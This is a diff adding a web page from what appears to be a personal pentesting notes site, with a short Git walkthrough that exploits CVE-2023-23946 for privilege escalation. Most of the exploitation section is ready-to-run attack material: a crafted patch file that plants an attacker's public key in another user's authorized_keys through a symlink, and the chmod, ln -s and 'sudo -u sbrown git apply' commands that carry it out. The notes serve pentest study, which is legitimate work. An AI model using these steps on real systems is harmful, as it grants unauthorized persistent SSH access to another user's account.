@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Git</h1>
+            <p>Git is a free and open source distributed version control system designed to handle everything from small to very large projects with speed and efficiency.</p>
+        </div>
+        <div class="notion-body">
+            <p>Always recomended to check the version of the application with <b>git --version</b> in order to identify related vulnerabilities</p>
+            <h2>Exploitation</h2>
+            <ul>
+                <h3>Privilege escalation - CVE-2023-23946</h3>
+                <ul>
+                    <p>In case we already have a shell inside the machine and found a git version prior to <b>2.39.2, 2.38.4, 2.37.6, 2.36.5, 2.35.7, 2.34.7, 2.33.7, 2.32.6, 2.31.7, and 2.30.8</b></p>
+                    <p>We could be able to perform file write with privileges. To do so check the <a class="notion-link" href="https://github.com/bruno-1337/CVE-2023-23946-POC">repo</a>. Create a .patch file and place the following</p>
+                    <pre><code class="language-bash">diff --git a/symlink b/newsymlink
+rename from symlink
+rename to newsymlink
+--
+diff --git /dev/null b/newsymlink/authorized_keys
+new file mode 100644
+index 0000000..e47f4ea
+--- /dev/null
++++ b/newsymlink/authorized_keys
+@@ -0,0 +1 @@
++YOUR_PUBLIC_KEY_HERE</code></pre>
+                     <p>Move the file to /tmp/ to make it accessible for everyone and change it's permissions</p>   
+                     <pre><code class="language-bash">chmod 644 /tmp/exploit.patch</code></pre>   
+                     <p>Create the sym link to point to the folder you would like to modify</p>
+                     <pre><code class="language-bash">ln -s /home/sbrown/.ssh/ symlink</code></pre>
+                     <p>Finally execute the apply and wait which will write your public key into the authorized keys of your target user</p>
+                     <pre><code class="language-bash">sudo -u sbrown /usr/bin/git apply -v exploit.patch</code></pre>
+                </ul>
+            </ul>        
+            
+            
+
+        </div>
+    </div>
+
+
+</body>
+</html>
